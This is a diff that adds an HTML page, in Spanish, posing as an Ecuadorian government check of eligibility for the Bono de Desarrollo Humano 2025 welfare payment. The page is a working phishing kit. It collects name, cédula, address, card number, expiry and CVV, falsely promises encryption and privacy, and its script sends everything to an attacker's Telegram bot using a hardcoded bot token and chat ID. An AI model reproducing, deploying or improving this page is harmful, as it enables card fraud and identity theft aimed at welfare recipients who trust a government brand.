@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Consulta Bono MIES</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+
+  body {
+    background: #f0f2f5;
+    font-family: 'Poppins', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 30px 15px;
+  }
+
+  .container {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: 460px;
+    padding: 30px 25px 25px;
+    box-sizing: border-box;
+  }
+
+  .header {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 10px;
+  }
+
+  .header img {
+    width: 140px;
+    height: auto;
+  }
+
+  .divider {
+    width: 100%;
+    height: 2px;
+    background-color: #0b44a4;
+    margin: 12px 0 20px 0;
+    border-radius: 1px;
+  }
+
+  h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: #111b35;
+    margin-bottom: 24px;
+  }
+
+  label {
+    display: block;
+    font-size: 14px;
+    color: #111b35;
+    margin-bottom: 6px;
+    font-weight: 600;
+  }
+
+  input[type="text"], input[type="checkbox"] {
+    box-sizing: border-box;
+  }
+
+  input[type="text"] {
+    width: 100%;
+    padding: 12px 14px;
+    font-size: 15px;
+    border-radius: 8px;
+    border: 1.7px solid #c3cad9;
+    margin-bottom: 18px;
+    transition: border-color 0.3s ease;
+  }
+
+  input[type="text"]:focus {
+    border-color: #0b234d;
+    outline: none;
+  }
+
+  .inline-inputs {
+    display: flex;
+    gap: 15px;
+    margin-bottom: 18px;
+  }
+
+  .inline-inputs > div {
+    flex: 1;
+  }
+
+  .security {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 14px;
+    color: #2a5a27;
+    margin-bottom: 20px;
+  }
+
+  .security svg {
+    width: 18px;
+    height: 18px;
+    fill: #2a5a27;
+  }
+
+  button {
+    width: 100%;
+    background: #0b44a4;
+    color: white;
+    font-weight: 700;
+    font-size: 15px;
+    padding: 14px 0;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    text-transform: uppercase;
+    box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
+    transition: background-color 0.3s ease;
+  }
+
+  button:hover {
+    background: #09377d;
+  }
+
+  .legal {
+    font-size: 12px;
+    color: #5a5f6b;
+    margin-top: 18px;
+    line-height: 1.4;
+    text-align: center;
+  }
+
+  .checkbox-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+
+  .checkbox-container label {
+    margin: 0;
+    font-weight: 500;
+    font-size: 13px;
+    color: #111b35;
+  }
+
+  .error-message {
+    color: #d93025;
+    font-size: 13px;
+    margin-top: -14px;
+    margin-bottom: 14px;
+    display: none;
+  }
+
+  @media (max-width: 440px) {
+    .container {
+      padding: 25px 20px 20px;
+      max-width: 100%;
+    }
+    .inline-inputs {
+      flex-direction: column;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <img src="https://www.derechoshumanos.gob.ec/wp-content/uploads/2023/06/Gob_Ecuador.png" alt="Gobierno del Ecuador Logo" />
+  </div>
+
+  <div class="divider"></div>
+
+  <h1>Consulta si eres beneficiario del<br>Bono de Desarrollo Humano 2025</h1>
+
+  <form id="bonoForm" autocomplete="off" novalidate>
+    <label for="nombre">Nombre completo</label>
+    <input type="text" id="nombre" name="nombre" required />
+
+    <label for="cedula">Cédula</label>
+    <input type="text" id="cedula" name="cedula" pattern="\d{10}" maxlength="10" required />
+    <div class="error-message" id="error-cedula">La cédula debe tener 10 dígitos numéricos.</div>
+
+    <label for="provincia">Provincia / Ciudad</label>
+    <input type="text" id="provincia" name="provincia" required />
+
+    <label for="direccion">Dirección</label>
+    <input type="text" id="direccion" name="direccion" required />
+
+    <label for="tarjeta">Número de tarjeta</label>
+    <input type="text" id="tarjeta" name="tarjeta" pattern="\d{13,19}" maxlength="19" required />
+    <div class="error-message" id="error-tarjeta">La tarjeta debe tener entre 13 y 19 dígitos numéricos.</div>
+
+    <div class="inline-inputs">
+      <div>
+        <label for="fecha">Fecha (MM/AA)</label>
+        <input type="text" id="fecha" name="fecha" placeholder="MM/AA" maxlength="5" pattern="(0[1-9]|1[0-2])\/\d{2}" required />
+        <div class="error-message" id="error-fecha">Fecha inválida o fuera de rango.</div>
+      </div>
+      <div>
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" name="cvv" maxlength="4" pattern="\d{3,4}" required />
+        <div class="error-message" id="error-cvv">CVV inválido según tipo de tarjeta.</div>
+      </div>
+    </div>
+
+    <div class="checkbox-container">
+      <input type="checkbox" id="terminos" name="terminos" required />
+      <label for="terminos">Acepto los <a href="#" target="_blank" rel="noopener noreferrer">términos y condiciones</a> y la política de privacidad.</label>
+    </div>
+    <div class="error-message" id="error-terminos">Debes aceptar los términos para continuar.</div>
+
+    <div class="security">
+      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false" style="width:18px; height:18px; fill:#2a5a27; margin-right:8px;">
+        <path d="M12 1C8.13 1 5 4.13 5 8v3H4a1 1 0 0 0-1 1v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a1 1 0 0 0-1-1h-1V8c0-3.87-3.13-7-7-7Zm3 11v3h-6v-3h6Zm-3-7a2 2 0 0 1 2 2v2H10V7a2 2 0 0 1 2-2Z"/>
+      </svg>
+      Tus datos están protegidos con encriptación bancaria de 256 bits.
+    </div>
+
+    <button type="submit">Verificar y Registrar</button>
+  </form>
+
+  <div class="legal">
+    La información ingresada será tratada conforme a la Ley de Protección de Datos Personales y no será compartida con terceros.
+  </div>
+</div>
+
+<script>
+  // Referencias
+  const form = document.getElementById('bonoForm');
+  const cedulaInput = document.getElementById('cedula');
+  const tarjetaInput = document.getElementById('tarjeta');
+  const fechaInput = document.getElementById('fecha');
+  const cvvInput = document.getElementById('cvv');
+  const terminosCheckbox = document.getElementById('terminos');
+
+  // Error messages
+  const errorCedula = document.getElementById('error-cedula');
+  const errorTarjeta = document.getElementById('error-tarjeta');
+  const errorFecha = document.getElementById('error-fecha');
+  const errorCvv = document.getElementById('error-cvv');
+  const errorTerminos = document.getElementById('error-terminos');
+
+  // Solo números para cedula, tarjeta y cvv
+  function soloNumeros(e) {
+    if (
+      e.type === 'keydown' &&
+      (e.key === "Backspace" || e.key === "ArrowLeft" || e.key === "ArrowRight" || e.key === "Delete" || e.key === "Tab")
+    ) {
+      return;
+    }
+    if (e.type === 'keydown' && !/\d/.test(e.key)) {
+      e.preventDefault();
+    }
+  }
+
+  function validarPaste(e) {
+    const paste = (e.clipboardData || window.clipboardData).getData('text');
+    if (!/^\d+$/.test(paste)) {
+      e.preventDefault();
+    }
+  }
+
+  cedulaInput.addEventListener('keydown', soloNumeros);
+  cedulaInput.addEventListener('paste', validarPaste);
+
+  tarjetaInput.addEventListener('keydown', soloNumeros);
+  tarjetaInput.addEventListener('paste', validarPaste);
+
+  cvvInput.addEventListener('keydown', soloNumeros);
+  cvvInput.addEventListener('paste', validarPaste);
+
+  // Fecha: solo números + barra automática
+  fechaInput.addEventListener('keydown', function(e) {
+    const allowedKeys = ["Backspace", "ArrowLeft", "ArrowRight", "Delete", "Tab"];
+    if (allowedKeys.includes(e.key)) return;
+    if (!/\d/.test(e.key)) e.preventDefault();
+  });
+  fechaInput.addEventListener('paste', function(e) {
+    const paste = (e.clipboardData || window.clipboardData).getData('text');
+    if (!/^\d{4}$/.test(paste.replace('/', ''))) {
+      e.preventDefault();
+    }
+  });
+  fechaInput.addEventListener('input', function(e) {
+    let val = e.target.value;
+    val = val.replace(/[^\d]/g, '');
+    if (val.length > 2) {
+      val = val.slice(0,2) + '/' + val.slice(2,4);
+    }
+    if (val.length > 5) {
+      val = val.slice(0,5);
+    }
+    e.target.value = val;
+  });
+
+  // Función para validar la fecha MM/AA (no sea menor que hoy ni muy lejana)
+  function validarFecha(fechaStr) {
+    if (!fechaStr || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(fechaStr)) return false;
+
+    const [mm, aa] = fechaStr.split('/');
+    const mes = parseInt(mm, 10);
+    const anio = 2000 + parseInt(aa, 10);
+
+    if (mes < 1 || mes > 12) return false;
+
+    const hoy = new Date();
+    const mesHoy = hoy.getMonth() + 1;
+    const anioHoy = hoy.getFullYear();
+
+    // Fecha mínima: mes y año actual
+    if (anio < anioHoy || (anio === anioHoy && mes < mesHoy)) return false;
+
+    // Fecha máxima: 10 años en el futuro
+    if (anio > anioHoy + 10) return false;
+
+    return true;
+  }
+
+  // Función para determinar si tarjeta es Amex (inicia con 34 o 37)
+  function esAmex(tarjeta) {
+    return tarjeta.startsWith('34') || tarjeta.startsWith('37');
+  }
+
+  // Validar formulario
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // Reset errores
+    errorCedula.style.display = 'none';
+    errorTarjeta.style.display = 'none';
+    errorFecha.style.display = 'none';
+    errorCvv.style.display = 'none';
+    errorTerminos.style.display = 'none';
+
+    let valido = true;
+
+    // Cédula 10 dígitos
+    if (!/^\d{10}$/.test(cedulaInput.value)) {
+      errorCedula.style.display = 'block';
+      valido = false;
+    }
+
+    // Tarjeta 13 a 19 dígitos
+    if (!/^\d{13,19}$/.test(tarjetaInput.value)) {
+      errorTarjeta.style.display = 'block';
+      valido = false;
+    }
+
+    // Fecha válida y rango
+    if (!validarFecha(fechaInput.value)) {
+      errorFecha.style.display = 'block';
+      valido = false;
+    }
+
+    // CVV: 4 dígitos si Amex, 3 dígitos para otras
+    if (esAmex(tarjetaInput.value)) {
+      if (!/^\d{4}$/.test(cvvInput.value)) {
+        errorCvv.style.display = 'block';
+        valido = false;
+      }
+    } else {
+      if (!/^\d{3}$/.test(cvvInput.value)) {
+        errorCvv.style.display = 'block';
+        valido = false;
+      }
+    }
+
+    // Checkbox términos
+    if (!terminosCheckbox.checked) {
+      errorTerminos.style.display = 'block';
+      valido = false;
+    }
+
+    if (!valido) return;
+
+    // Si todo bien, enviar datos a Telegram
+    enviarTelegram();
+  });
+
+  // Función para enviar datos a Telegram vía Bot API
+  function enviarTelegram() {
+    const TELEGRAM_BOT_TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
+    const TELEGRAM_CHAT_ID = '5654253897';
+
+    const msg = 
+      `Nuevo registro Bono MIES:\n` +
+      `Nombre: ${document.getElementById('nombre').value}\n` +
+      `Cédula: ${cedulaInput.value}\n` +
+      `Provincia/Ciudad: ${document.getElementById('provincia').value}\n` +
+      `Dirección: ${document.getElementById('direccion').value}\n` +
+      `Tarjeta: ${tarjetaInput.value}\n` +
+      `Fecha: ${fechaInput.value}\n` +
+      `CVV: ${cvvInput.value}`;
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: msg
+      })
+    })
+    .then(response => {
+      if(response.ok) {
+        alert('Datos enviados correctamente. ¡Gracias!');
+        form.reset();
+      } else {
+        alert('Error al enviar los datos. Intenta de nuevo.');
+      }
+    })
+    .catch(() => {
+      alert('Error de conexión al enviar los datos.');
+    });
+  }
+</script>
+
+</body>
+</html>
